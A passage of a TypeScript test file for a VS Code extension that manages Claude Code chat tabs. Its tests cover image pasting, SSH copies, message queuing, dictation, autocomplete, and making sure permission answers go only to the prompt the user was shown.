  assert.ok(asHtml(tree).includes('<code><span class="cv-kw">if</span> x:\n    <span class="cv-fn">go</span>()</code>'), asHtml(tree));
});

test("a picture pasted in a chat's tab is saved, an SSH host's chat gets a copy there; nothing else is taken", async () => {
  const saved: string[][] = [];
  const backend = {
    pane: async () => ({ ok: true, unchanged: true }),
    saveImage: async (mime: string, data: string) => (saved.push(["save", mime, data]), { path: "/cache-here/talpy-den/images/20261026-101500.png", message: "" }),
    putImage: async (host: string, path: string) => (saved.push(["put", host, path]), host === "down" ? { message: "no route" } : { path: "/cache-there/talpy-den/images/20261026-101500.png", message: "" }),
  };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, {} as never, { find: async () => undefined } as never, {} as never);
  let tabs = 0;
  const tab = async (host: string, m: unknown) => {
    const chatId = `chat-${++tabs}`; // (a tab of its own)
    p.open({ chatId, sessionId: chatId, profileDir: ".claude", name: "x", host: host || undefined } as never);
    const panel = recorded.panels.at(-1)!;
    panel.receive(m);
    await new Promise((r) => setTimeout(r, 10));
    return panel.sent.filter((x) => (x as { type: string }).type === "picture");
  };
  assert.deepEqual(await tab("", { type: "picture", id: "1", mime: "image/png", data: "iVBORw0K" }),
                   [{ type: "picture", id: "1", path: "/cache-here/talpy-den/images/20261026-101500.png", error: "" }]);
  assert.deepEqual(await tab("lab", { type: "picture", id: "2", mime: "image/png", data: "iVBORw0K" }),
                   [{ type: "picture", id: "2", path: "/cache-there/talpy-den/images/20261026-101500.png", error: "" }]);
  assert.deepEqual((await tab("down", { type: "picture", id: "3", mime: "image/png", data: "iVBORw0K" }))[0],
                   { type: "picture", id: "3", path: "", error: "Couldn't copy the picture to down: no route" });
  assert.deepEqual(await tab("", { type: "picture", id: "4", mime: "image/svg+xml", data: "PHN2Zz4=" }),
                   [{ type: "picture", id: "4", path: "", error: "Claude takes PNG, JPEG, WebP and GIF pictures" }]);
  assert.deepEqual(saved.map((c) => c[0] + " " + c[1]), ["save image/png", "save image/png", "put lab", "save image/png", "put down"]);
});

// Nothing reads a hidden tab's conversation: shown again, it's read at once
// (Claude's last reply), and focus moving between editors doesn't put that off
test("a chat's tab shown again reads its conversation at once", async () => {
  let reads = 0;
  const backend = { pane: async (args: string[]) => (args[0] === "--conversation" && reads++, { ok: true, unchanged: true }) };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: true };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { canMoveToClaudeCode: () => false } as never,
                          { find: async () => undefined } as never, {} as never);
  p.open({ chatId: "shown-again", sessionId: "shown-again", profileDir: ".claude", name: "x" } as never);
  const panel = recorded.panels.at(-1)!;
  try {
    panel.show(true);
    panel.receive({ type: "ready" });
    await new Promise((r) => setTimeout(r, 10));
    const first = reads;
    panel.show(false);
    panel.show(true);
    await new Promise((r) => setTimeout(r, 10));
    assert.equal(reads, first + 1, "read when shown, not 5 s later");
    panel.show(true); // (another view-state event: focus moved)
    await new Promise((r) => setTimeout(r, 10));
    assert.equal(reads, first + 1);
  } finally {
    p.dispose();
  }
});

// The watcher (pane.py --wait) ends while the tab is hidden; shown again with
// nothing new, it waits on the transcript again (one, never two), not a look every 1.5 s
test("a chat's tab shown again waits on its transcript again, one watcher at a time", async () => {
  const calls: string[] = [];
  let release = () => {};
  const backend = { pane: async (args: string[]) => {
    if (args.includes("--wait")) return (calls.push("wait"), await new Promise<void>((r) => (release = r)), { ok: true, unchanged: true });
    calls.push(args.includes("--if-changed") ? "changed?" : "read");
    return args.includes("--if-changed") ? { ok: true, unchanged: true } : { ok: true, items: [], more: false, stamp: "10:1/120" };
  } };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { canMoveToClaudeCode: () => false } as never,
                          { find: async () => undefined } as never, {} as never);
  const tick = (ms = 10) => new Promise((r) => setTimeout(r, ms));
  p.open(chatRefOf(demoState(NOW).status!.groups.flatMap((g) => g.sessions)[0]));
  const panel = recorded.panels.at(-1)!;
  try {
    panel.show(true);
    panel.receive({ type: "ready" });
    await tick();
    assert.deepEqual(calls.splice(0), ["read", "wait"]);
    panel.show(false);
    panel.show(true); // (back while it still waits: that one goes on)
    await tick();
    assert.deepEqual(calls.splice(0), ["changed?"]);
    await tick(300);
    panel.show(false);
    release(); // (its wait ends while hidden: it stops)
    await tick();
    panel.show(true);
    await tick();
    assert.deepEqual(calls.splice(0), ["changed?", "wait"]);
  } finally {
    p.dispose();
    release();
  }
});

// New Chat… in a Talpy Chat tab: an empty tab for the account and folder, its first message starts the chat in
// the background (pane.py --start), and the tab goes on with it under its id; one sent meanwhile goes to it after
test("a new chat's tab starts it with its first message, then goes on with it", async () => {
  const NEW = "c0ffee00-0000-4000-8000-000000000001";
  const calls: string[][] = [];
  let release: () => void = () => undefined;
  const started = new Promise<void>((r) => (release = r));
  const backend = { pane: async (args: string[]) => {
    calls.push(own(args));
    if (args[0] === "--start") {
      await started;
      return { ok: true, how: "background", chat: NEW, id: NEW.slice(0, 8), profileDir: ".claude-work", message: "Started" };
    }
    return args[0] === "--send" ? { ok: true, how: "typed", message: "Sent" } : { ok: false, missing: true, message: "not yet" };
  } };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }),
                 onLive: () => ({ dispose() {} }), liveHook: false, setActionError() {}, setActionInfo() {} };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { canMoveToClaudeCode: () => false } as never,
                          { find: async () => undefined } as never, {} as never);
  const tick = (ms = 10) => new Promise((r) => setTimeout(r, ms));
  const group = { id: "g", title: "work · Team", chatProfile: ".claude-work" } as never;
  p.openNew(group, { path: "/home/me/repos/app", short: "~/repos/app" }, "Fix the tests");
  const panel = recorded.panels.at(-1)!;
  const chats = () => panel.sent.filter((m) => (m as { type: string }).type === "chat").map((m) => (m as { chat: { chatId: string; fresh?: { account: string; folder: string } | null; starting?: boolean; where: string; stateText: string } }).chat);
  try {
    panel.show(true);
    panel.receive({ type: "ready" });
    await tick();
    assert.equal((panel as unknown as { title: string }).title, "New chat in ~/repos/app");
    const first = chats().at(-1)!;
    assert.deepEqual([first.fresh?.account, first.fresh?.folder, first.where, first.stateText, first.starting], ["work · Team", "~/repos/app", "new", "new", false]);
    assert.ok(panel.sent.some((m) => JSON.stringify(m) === JSON.stringify({ type: "startWith", text: "Fix the tests" })), "the task goes as its first message");
    assert.equal(calls.length, 0, "nothing read or started before it's sent");
    panel.receive({ type: "send", text: "Fix the tests", how: "auto", afterTurn: false, id: 1 });
    panel.receive({ type: "send", text: "and the docs", how: "auto", afterTurn: false, id: 2 });
    await tick();
    assert.equal(calls.filter((c) => c[0] === "--start").length, 1, "started once");
    const start = calls.find((c) => c[0] === "--start")!;
    assert.deepEqual(start.slice(0, 6), ["--start", ".claude-work", "--cwd", "/home/me/repos/app", "--text", "Fix the tests"]);
    assert.equal(chats().at(-1)!.starting, true, "Starting…");
    release();
    await tick(50);
    const results = panel.sent.filter((m) => (m as { type: string; kind?: string }).type === "result").map((m) => m as { kind: string; ok: boolean; went?: boolean; id?: number });
    assert.deepEqual(results.map((r) => [r.kind, r.ok, r.went, r.id]), [["send", true, true, 1], ["send", true, true, 2]]);
    const send = calls.find((c) => c[0] === "--send")!;
    assert.deepEqual(send.slice(0, 4), ["--send", NEW, "--text", "and the docs"], "the second one to the chat it started");
    assert.equal(chats().at(-1)!.chatId, NEW);
    assert.equal(chats().at(-1)!.fresh, null);
  } finally {
    p.dispose();
    release();
  }
});

// Closing a chat's terminal, Claude moves it to the background under a new id
// (the status's "moved"): its tab goes on with it there, not with the old
// transcript, which stops at the move
test("a chat's tab follows the chat Claude moved to the background under a new id", async () => {
  const state = demoState(NOW);
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.chatId)!;
  const old = "0dd0dd00-0000-4000-8000-000000000001";
  const reads: string[] = [];
  const backend = { pane: async (args: string[]) => (args[0] === "--conversation" && reads.push(args[1]), { ok: true, unchanged: true }) };
  const changed: (() => void)[] = [];
  const dash = { opened() {}, state: () => state, refresh: async () => undefined, pollHost: async () => undefined,
                 onState: (l: () => void) => (changed.push(l), { dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: true };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { canMoveToClaudeCode: () => false } as never,
                          { find: async () => undefined } as never, {} as never);
  p.open({ chatId: old, sessionId: old, profileDir: row.profileDir, name: row.name } as never);
  const panel = recorded.panels.at(-1)!;
  try {
    panel.show(true);
    panel.receive({ type: "ready" });
    await new Promise((r) => setTimeout(r, 10));
    assert.deepEqual(reads, [old]);
    state.status!.moved = { [old]: row.chatId };
    changed.forEach((l) => l());
    await new Promise((r) => setTimeout(r, 10));
    assert.equal(reads.at(-1), row.chatId);
    const chats = panel.sent.filter((m) => (m as { type: string }).type === "chat") as { chat: { chatId: string; state: string } }[];
    assert.deepEqual([chats.at(-1)!.chat.chatId, chats.at(-1)!.chat.state], [row.chatId, row.state]);
    const tabs = recorded.panels.length;
    p.open({ chatId: old, sessionId: old, profileDir: row.profileDir, name: row.name } as never);
    assert.equal(recorded.panels.length, tabs, "the same tab, by the id it had");
  } finally {
    p.dispose();
  }
});

// A message sent while the one before is on its way, to a chat Claude then
// moves to the background, goes to the new id once that one has gone
test("a message waiting its turn goes to the chat's new id when Claude moved it meanwhile", async () => {
  const state = demoState(NOW);
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.chatId)!;
  const old = "0dd0dd00-0000-4000-8000-000000000001";
  const sent: string[][] = [];
  let first = () => {};
  const backend = {
    pane: async (args: string[]) => {
      sent.push([args[1], args.includes("--session") ? args[args.indexOf("--session") + 1] : ""]);
      if (sent.length === 1) await new Promise<void>((r) => (first = r));
      return { ok: true, how: "background", message: "Sent" };
    },
  };
  const dash = { opened() {}, state: () => state, refresh: async () => undefined, pollHost: async () => undefined };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, {} as never, { find: async () => undefined } as never, {} as never);
  const ref = { chatId: old, sessionId: old, profileDir: row.profileDir, name: row.name } as never;
  const one = p.send(ref, "one", "background", false);
  const two = p.send(ref, "two", "background", false);
  await new Promise((r) => setTimeout(r, 0));
  state.status!.moved = { [old]: row.chatId };
  first();
  await Promise.all([one, two]);
  assert.deepEqual(sent, [[old, old], [row.chatId, row.sessionId]]);
});

test("the pictures a reply names, each once, and taking one out", () => {
  const a = "/cache-here/talpy-den/images/a.png";
  const text = `look [Image: ${a}] and [Image: /x/b.jpg] again [Image: ${a}]`;
  assert.deepEqual(picturesIn(text), [a, "/x/b.jpg"]);
  assert.equal(withoutPicture(text, a), "look and [Image: /x/b.jpg] again ");
});

test("a file dropped on a reply is named as Claude's prompt names it; a drop's links are its paths", async () => {
  const { droppedPaths, fileMention } = await import("../src/shared/pane");
  assert.equal(fileMention("/home/me/src/app.py"), "@/home/me/src/app.py");
  assert.equal(fileMention("/home/me/My Notes/todo.md"), '@"/home/me/My Notes/todo.md"');
  assert.deepEqual(droppedPaths("file:///home/me/a%20b.txt\r\nhttps://example.com/x\n# a comment\nfile:///tmp/c.png"),
    ["/home/me/a b.txt", "/tmp/c.png"]);
  assert.deepEqual(droppedPaths(""), []);
});

test("the reply box offers commands at the start and files after @, best first", async () => {
  const { suggestFor } = await import("../src/shared/pane");
  const offers = {
    commands: [{ name: "/compact", about: "Free up context", kind: "Claude" }, { name: "/ship", about: "Ship it", kind: "yours" },
               { name: "/git:compare", about: "Compare", kind: "project" }],
    files: ["src/parser/compiler.ts", "docs/compiling.md", "comp.py", "tests/my notes.txt"],
    history: [],
  };
  const c = suggestFor("/comp", offers);
  assert.deepEqual(c.items.map((i) => i.text), ["/compact", "/git:compare"]);
  assert.equal(c.items[1].about, "Compare · project");
  assert.equal(c.start, 0);
  assert.deepEqual(suggestFor("fix /comp", offers).items, []); // (a command only at the start)
  const f = suggestFor("look at @comp", offers);
  assert.deepEqual(f.items.map((i) => i.text), ["@comp.py", "@docs/compiling.md", "@src/parser/compiler.ts"]); // (names that start with it, shorter paths first)
  assert.equal(f.start, "look at ".length);
  assert.equal(suggestFor("see @notes", offers).items[0].insert, '@"tests/my notes.txt" ');
  assert.deepEqual(suggestFor("look at @comp", offers, "@comp").items, []); // (Esc closed it for that word)
  assert.deepEqual(suggestFor("/comp", null).items, []);
});

test("the microphone: recorded, then written down; a missing model or setup is offered, and said when it's there", async () => {
  const calls: string[][] = [];
  let status: Record<string, unknown> = { ok: true, tool: "/usr/bin/whisper-cli", model: "/m.bin" };
  const backend = {
    pane: async () => ({ ok: true, unchanged: true }),
    dictate: async (args: string[]) => (calls.push(args), args[0] === "--status" ? status
      : args[0] === "--stop" ? { ok: true, text: "Fix the parser" } : { ok: true, message: "" }),
  };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, {} as never, { find: async () => undefined } as never, {} as never);
  p.open({ chatId: "mic-1", sessionId: "mic-1", profileDir: ".claude", name: "x" } as never);
  const panel = recorded.panels.at(-1)!;
  const say = async (action: string) => {
    panel.receive({ type: "dictate", action });
    await new Promise((r) => setTimeout(r, 10));
    return panel.sent.filter((x) => (x as { type: string }).type === "dictation").slice(-1)[0];
  };
  assert.deepEqual(await say("toggle"), { type: "dictation", state: "recording" });
  assert.deepEqual(await say("toggle"), { type: "dictation", state: "", text: "Fix the parser", message: "" });
  assert.deepEqual(calls.map((c) => c[0]), ["--status", "--start", "--stop"]);
  assert.equal(calls[1][1], calls[2][1]); // (the same recording)
  assert.ok(calls[2].includes("--language"));
  status = { ok: false, engine: "whisper.cpp", tool: "/usr/bin/whisper-cli", model: null, recorder: "pw-record" };
  assert.deepEqual(await say("toggle"), { type: "dictation", state: "", offerModel: true, engine: "whisper.cpp" });
  // nothing writes it down: setting it up is offered, then done when you say so
  status = { ok: false, engine: null, tool: null, model: null, recorder: "pw-record", canSetup: true, setupMb: 612, missing: [] };
  assert.deepEqual(await say("toggle"), { type: "dictation", state: "", offerSetup: true, setupMb: 612 });
  calls.length = 0;
  assert.deepEqual(await say("setup"), { type: "dictation", state: "", message: "", ok: true });
  assert.deepEqual(calls, [["--setup"]]);
  status = { ok: false, engine: null, tool: null, model: null, recorder: null, canSetup: true, missing: ["a recorder (pw-record, from PipeWire)"] };
  assert.equal(((await say("toggle")) as { message?: string }).message, "To dictate, install a recorder (pw-record, from PipeWire).");
});

// ---------------------------------------------------------------- answers to the prompt shown

test("an answer goes to the prompt that was shown, never to one the chat asks after it", async () => {
  // the hook: a chat that asks something else now (answered in its terminal, then the next command) isn't answered
  const state = waitingState("hook");
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  row.permission!.toolUse = "toolu_A";
  const shown = shownAsk(row.permission)!;
  const { p, calls } = panes(state);
  row.permission = { ...row.permission!, line: "Bash: rm -rf build", command: "rm -rf build", request: "1792957203600-0b1c2d3e", toolUse: "toolu_B" };
  assert.deepEqual(await p.answer(chatRefOf(row), "allow", shown), { ok: false, message: "It asks something else now", changed: true });
  assert.equal((await p.answer(chatRefOf(row), "always", null)).ok, false, "nothing shown: nothing answered");
  assert.deepEqual(calls, []);
  // the same prompt (its tool use), whose hook request came after it was shown: that request
  row.permission = { ...row.permission!, line: "Bash: git tag v2.0.0", command: "git tag v2.0.0", request: "1792957203525-37d298fb", toolUse: "toolu_A" };
  await p.answer(chatRefOf(row), "allow", { ...shown, request: null });
  assert.deepEqual(calls[0], ["--answer", "1792957203525-37d298fb", "--decision", "allow"]);
  // the request shown, even when the state has a newer one for that tool use (pane.py answers that request only)
  row.permission = { ...row.permission!, request: "1792957203700-99aa88bb" };
  await p.answer(chatRefOf(row), "deny", shown);
  assert.deepEqual(calls[1], ["--answer", "1792957203525-37d298fb", "--decision", "deny"]);

  // keys (tmux): pressed only while it still asks about that tool use
  const keys = waitingState("keys");
  const k = keys.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  k.permission!.toolUse = "toolu_K";
  const two = panes(keys);
  await two.p.answer(chatRefOf(k), "deny", shownAsk(k.permission));
  assert.deepEqual(two.calls[0], ["--keys", k.sessionId, "--profile", k.profileDir, "--expect", "toolu_K", "--decision", "deny"]);
  const moved = panes(keys, { ok: false, message: "It asks something else now", changed: true }); // (pane.py found it moved on)
  assert.deepEqual(await moved.p.answer(chatRefOf(k), "allow", shownAsk(k.permission)), { ok: false, message: "It asks something else now", changed: true });

  // an older backend's prompt (no tool use): by its line
  const old = waitingState("keys");
  const o = old.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  const three = panes(old);
  assert.equal((await three.p.answer(chatRefOf(o), "allow", { ...shownAsk(o.permission)!, line: "Bash: npm publish" })).ok, false);
  await three.p.answer(chatRefOf(o), "allow", shownAsk(o.permission));
  assert.deepEqual(three.calls, [["--keys", o.sessionId, "--profile", o.profileDir, "--decision", "allow"]]);
});

test("what a page says it showed is taken only in its shape; the chat tab's answer carries it", async () => {
  const { askShownOf } = await import("../src/shared/pane");
  assert.deepEqual(askShownOf({ request: "1-a", toolUse: null, line: "Bash: make" }), { request: "1-a", toolUse: null, line: "Bash: make" });
  for (const bad of [null, "x", [], { request: 1, toolUse: null, line: "" }, { request: null, toolUse: "", line: "" },
                     { request: null, toolUse: null }, { request: "x".repeat(201), toolUse: null, line: "" }])
    assert.equal(askShownOf(bad), null);

  const state = waitingState("hook");
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  const calls: string[][] = [];
  const backend = { pane: async (args: string[]) => (calls.push(own(args)), args[0] === "--conversation" ? { ok: true, unchanged: true } : { ok: true, message: "Allowed" }) };
  const dash = { opened() {}, state: () => state, refresh: async () => undefined, pollHost: async () => undefined, setActionError() {}, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, {} as never, { find: async () => undefined } as never, {} as never);
  p.open(chatRefOf(row));
  const panel = recorded.panels.at(-1)!;
  const results = () => panel.sent.filter((m) => (m as { type: string }).type === "result");
  panel.receive({ type: "answer", decision: "allow", note: "", shown: shownAsk(row.permission) });
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(calls.at(-1), ["--answer", "1792957203525-37d298fb", "--decision", "allow"]);
  panel.receive({ type: "answer", decision: "allow", note: "", shown: { request: "1792957100000-00000000", toolUse: null, line: "Bash: make" } });
  await new Promise((r) => setTimeout(r, 10));
  assert.equal(calls.length, 1);
  assert.deepEqual(results().at(-1), { type: "result", kind: "answer", ok: false, message: "It asks something else now" });
});

test("a chat that asks something else while it waits is told again, with buttons for that prompt; its request coming late isn't news", async () => {
  const { TransitionTracker } = await import("../src/transitions");
  const opts = { notifyWaiting: true, notifyDone: true, notifyDoneMinSeconds: 0 };
  const g = demoState(NOW).status!.groups[0];
  const row = (state: "working" | "waiting", permission: unknown) => [{ ...g, sessions: [{ ...g.sessions[0], key: "k", chatId: "k", sessionId: "k", name: "k", state, permission } as never] }];
  const ask = (toolUse: string, request: string | null, command: string) =>
    ({ tool: "Bash", line: `Bash: ${command}`, command, file: "", diff: [], always: "", request, toolUse, answer: "hook" });
  const told = (c: { notices: { body: string; session: { permission?: { request: string | null } | null } }[] }) =>
    c.notices.map((n) => [n.body.split(" · ")[0], n.session.permission?.request]);
  const t = new TransitionTracker();
  t.track("", row("working", null), NOW, undefined, opts);
  assert.deepEqual(told(t.track("", row("waiting", ask("toolu_A", "1-a", "npm test")), NOW + 2000, undefined, opts)), [["npm test", "1-a"]]);
  // answered in its terminal; by the next check it asks for the next command (no working in between)
  assert.deepEqual(told(t.track("", row("waiting", ask("toolu_B", "2-b", "rm -rf build")), NOW + 4000, undefined, opts)), [["rm -rf build", "2-b"]]);
  assert.deepEqual(told(t.track("", row("waiting", ask("toolu_B", "2-b", "rm -rf build")), NOW + 6000, undefined, opts)), []);
  // the same command asked again (a new tool use) is a new prompt too
  assert.deepEqual(told(t.track("", row("waiting", ask("toolu_C", "3-c", "rm -rf build")), NOW + 8000, undefined, opts)), [["rm -rf build", "3-c"]]);
  // the hook's request coming a check after the prompt: the same prompt, told once
  const t2 = new TransitionTracker();
  t2.track("", row("working", null), NOW, undefined, opts);
  assert.equal(t2.track("", row("waiting", ask("toolu_D", null, "make")), NOW + 2000, undefined, opts).notices.length, 1);
  assert.deepEqual(t2.track("", row("waiting", ask("toolu_D", "4-d", "make")), NOW + 4000, undefined, opts).notices, []);
});

// ---------------------------------------------------------------- one message at a time

test("messages to a chat go one at a time, in the order sent: one sent while the last is on its way goes once that one has; the tab always hears back", async () => {
  const state = demoState(NOW);
  const row = state.status!.groups.flatMap((g) => g.sessions)[0];
  const calls: string[][] = [];
  const waiting: ((answer: unknown) => void)[] = [];
  const release = (answer: unknown) => waiting.splice(0).forEach((r) => r(answer));
  let fail = false;
  const backend = {
    pane: (args: string[]) => {
      if (args[0] === "--conversation") return Promise.resolve({ ok: true, unchanged: true });
      calls.push(args);
      return fail ? Promise.reject(new Error("the helper fell over")) : new Promise((r) => waiting.push(r));
    },
  };
  const dash = { opened() {}, state: () => state, refresh: async () => undefined, pollHost: async () => undefined, setActionError() {}, setActionInfo() {},
                 onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { open: async () => undefined } as never,
                          { find: async () => undefined } as never, {} as never);
  const tick = () => new Promise((r) => setTimeout(r, 10));
  const first = p.send(chatRefOf(row), "fix the parser", "auto", false);
  const second = p.send(chatRefOf(row), "and the tests", "auto", false); // (sent while the first is on its way)
  const later = p.send(chatRefOf(row), "and the docs", "background", true);
  await tick();
  assert.equal(calls.length, 1, "one at a time");
  release({ ok: true, how: "typed", message: "Sent (typed into the background chat)" });
  assert.deepEqual(await first, { ok: true, message: "Sent (typed into the background chat)", went: true });
  await tick();
  assert.equal(calls.length, 2, "then the next, in order");
  assert.equal(calls[1][calls[1].indexOf("--text") + 1], "and the tests");
  release({ ok: true, how: "background", message: "Sent: the chat goes on with it in the background" });
  assert.equal((await second).went, true);
  await tick();
  assert.ok(calls[2].includes("--after-turn"));
  release({ ok: true, message: "It's sent when this turn ends" });
  assert.deepEqual(await later, { ok: true, message: "It's sent when this turn ends", went: false });
  assert.equal(calls.length, 3, "none dropped");
  // the tab hears back about every send, with the id it gave it (shown as you sent it), even one that
  // failed on the way (it's back in the box)
  p.open(chatRefOf(row));
  const panel = recorded.panels.at(-1)!;
  panel.receive({ type: "send", text: "hello", how: "auto", afterTurn: false, id: 7 });
  await tick();
  release({ ok: true, how: "typed", message: "Sent (typed into the background chat)" });
  await tick();
  fail = true;
  panel.receive({ type: "send", text: "hello again", how: "auto", afterTurn: false, id: 8 });
  await tick();
  assert.deepEqual(panel.sent.filter((m) => (m as { type: string }).type === "result"), [
    { type: "result", kind: "send", ok: true, message: "Sent (typed into the background chat)", went: true, id: 7 },
    { type: "result", kind: "send", ok: false, message: "Couldn't send it: the helper fell over", id: 8 },
  ]);
});

// A message sent while Claude works is held a moment in the tab, to be taken
// back; its tab closed meanwhile, it goes all the same when its moment is up
// (as Plasma's closed window sends it); one taken back doesn't
test("a held message goes when its moment is up, also when its tab closed first; one taken back doesn't", async () => {
  const row = demoState(NOW).status!.groups.flatMap((g) => g.sessions)[0];
  const sent: string[] = [];
  const backend = { pane: async (args: string[]) => args[0] === "--send"
    ? (sent.push(args[args.indexOf("--text") + 1]), { ok: true, how: "background", message: "Sent" }) : { ok: true, unchanged: true } };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, setActionError() {},
                 onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { canMoveToClaudeCode: () => false } as never,
                          { find: async () => undefined } as never, {} as never);
  p.open(chatRefOf(row));
  const panel = recorded.panels.at(-1)!;
  panel.show(true);
  panel.receive({ type: "ready" });
  await new Promise((r) => setTimeout(r, 10));
  panel.receive({ type: "hold", id: 1, text: "also run the linter", how: "auto" });
  panel.receive({ type: "hold", id: 2, text: "never mind", how: "auto" });
  panel.receive({ type: "unhold", id: 2 });
  mock.timers.enable({ apis: ["setTimeout"] });
  try {
    panel.dispose();
    await Promise.resolve();
    assert.deepEqual(sent, [], "not before its moment");
    mock.timers.tick(HOLD_MS);
  } finally {
    mock.timers.reset();
  }
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(sent, ["also run the linter"]);
});

// A background chat that asks you something: your reply answers it (never stops the chat)
test("a reply to a background chat that asks something answers it: a No with your words, or a question's own answer", () => {
  const ask = { tool: "Bash", line: "Bash: npm publish", command: "npm publish", file: "", diff: [], always: "", request: "1-abcdef01", answer: "hook" as const };
  const q = (question: string) => ({ question, header: "", multiSelect: false, options: [{ label: "Yes", description: "" }] });
  const of = (permission: object | null, where = "background") => replyAnswers({ where, permission } as never);
  assert.deepEqual([of(ask), of({ ...ask, plan: { title: "Plan" } }), of({ ...ask, questions: [q("Which?")] }), of({ ...ask, questions: [q("A?"), q("B?")] })],
                   ["deny", "plan", "question", "decline"]);
  assert.deepEqual([of({ ...ask, answer: "" }), of(ask, "tmux"), of(null)], ["", "", ""], "only its own prompt, not in the background, or not asking");
  assert.match(routeHint("background", true, "bg", "", "deny"), /denies it/);
});

// An SSH host's chat has no watcher: just after you sent it something it's
// read every second (as Plasma's window does) till that shows, else every 5 s
test("an SSH host's chat is read every second just after you sent it something, till something new shows", async () => {
  const row = { ...demoState(NOW).status!.groups.flatMap((g) => g.sessions)[0], host: "lab" };
  let reads = 0;
  let fresh = false;
  const backend = { pane: async (args: string[]) => args[0] === "--send" ? { ok: true, how: "typed", message: "Sent" }
    : (reads++, fresh ? { ok: true, items: [], more: false, stamp: "20:2/120" } : { ok: true, unchanged: true }) };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined,
                 onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { canMoveToClaudeCode: () => false } as never,
                          { find: async () => undefined } as never, {} as never);
  const flush = async () => { for (let i = 0; i < 20; i++) await Promise.resolve(); };
  mock.timers.enable({ apis: ["setTimeout"] });
  try {
    p.open(chatRefOf(row, "lab"));
    const panel = recorded.panels.at(-1)!;
    panel.show(true);
    panel.receive({ type: "ready" });
    await flush();
    panel.receive({ type: "send", text: "and the docs", how: "auto", afterTurn: false, id: 1 });
    await flush();
    const sent = reads;
    mock.timers.tick(1000);
    await flush();
    mock.timers.tick(1000);
    await flush();
    assert.equal(reads, sent + 2, "every second");
    fresh = true; // (it shows)
    mock.timers.tick(1000);
    await flush();
    mock.timers.tick(4000);
    await flush();
    assert.equal(reads, sent + 3, "then every 5 s");
    mock.timers.tick(1000);
    await flush();
    assert.equal(reads, sent + 4);
    p.dispose();
  } finally {
    mock.timers.reset();
  }
});

test("your pictures read as Claude's terminal writes them: [Image #1], [Image #2], one picture named twice the same number", () => {
  assert.equal(numberedPictures("look [Image: /c/a.png] and [Image: /c/b.png], then [Image: /c/a.png] again"),
               "look [Image #1] and [Image #2], then [Image #1] again");
  assert.equal(numberedPictures("[Image #1] pasted in the terminal"), "[Image #1] pasted in the terminal");
});

test("↑ in the reply box: this chat's prompts first, the ones just sent before them, then your past ones there, each once", () => {
  const you = (key: string, text: string) => ({ kind: "you" as const, key, text, at: NOW });
  const items = [you("a", "first"), { kind: "claude" as const, key: "c", text: "a reply", at: NOW }, you("b", "did you update the plan?")];
  const pending = (id: number, text: string, state: "held" | "sending" | "sent") => ({ id, text, at: NOW, state, sentAt: 0, known: [] });
  // the past prompts (history.jsonl) don't have the ones sent from the tab: the conversation does
  assert.deepEqual(promptHistory(items, [], ["older one", "first"]), ["did you update the plan?", "first", "older one"]);
  // one on its way (not in the conversation yet) comes first; one held, still in its band to take back, doesn't
  assert.deepEqual(promptHistory(items, [pending(1, "what are the shortcuts?", "sent"), pending(2, "not yet", "held")], []),
                   ["what are the shortcuts?", "did you update the plan?", "first"]);
  // the same words (spaces as they come) once, at their newest
  assert.deepEqual(promptHistory([...items, you("d", "first ")], [], ["first"]), ["first", "did you update the plan?"]);
  assert.deepEqual(promptHistory([], [], []), []);
});

test("your message shows at once till the conversation has it; a stamp read before the one shown isn't taken", () => {
  const you = (key: string, text: string, at: number) => ({ kind: "you" as const, key, text, at });
  const sent = (id: number, text: string, state: "sending" | "sent", known: string[] = ["a"]) =>
    ({ id, text, at: NOW, state, sentAt: state === "sent" ? NOW : 0, known });
  const items = [you("a", "hello", NOW - 60000)];
  // not there yet: shown
  assert.deepEqual([...pendingTaken(items, [sent(1, "fix  the\nparser", "sending")], NOW + 100, true)], []);
  // there with its words (spaces as they come), or the start of them cut with …
